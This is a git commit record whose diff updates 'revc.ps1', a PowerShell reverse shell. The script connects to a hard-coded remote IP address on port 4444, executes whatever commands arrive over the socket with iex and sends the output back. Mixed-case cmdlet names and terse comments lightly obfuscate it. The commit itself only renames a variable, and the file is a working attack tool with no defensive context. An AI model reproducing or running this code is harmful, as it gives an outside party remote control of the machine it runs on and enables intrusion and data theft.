b411fb54baf27c34cd6a05f59efbad9d8e5b81f1
playcards21 <2doflow@gmail.com>
2024-10-31 21:37:13 -0700

    Update revc.ps1

--- revc.ps1
+++ revc.ps1
@@ -1,7 +1,7 @@
-$al=(New-OBject Net.Sockets.TCPClient("4.204.56.232",4444)).GEtstream();
+$gl=(New-OBject Net.Sockets.TCPClient("4.204.56.232",4444)).GEtstream();
 # Of
-[byte[]]$bt=0..65530|%{0};while(($i=$al.Read($bt,0,$bt.LEngth)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).Getstring($bt,0,$i);
+[byte[]]$bt=0..65530|%{0};while(($i=$gl.Read($bt,0,$bt.LEngth)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).Getstring($bt,0,$i);
 # Co
 $st=([text.encoding]::ASCII).Getbytes((iex $d 2>&1));
 # Do
-$al.Write($st,0,$st.lEngth)}
+$gl.Write($st,0,$st.lEngth)}
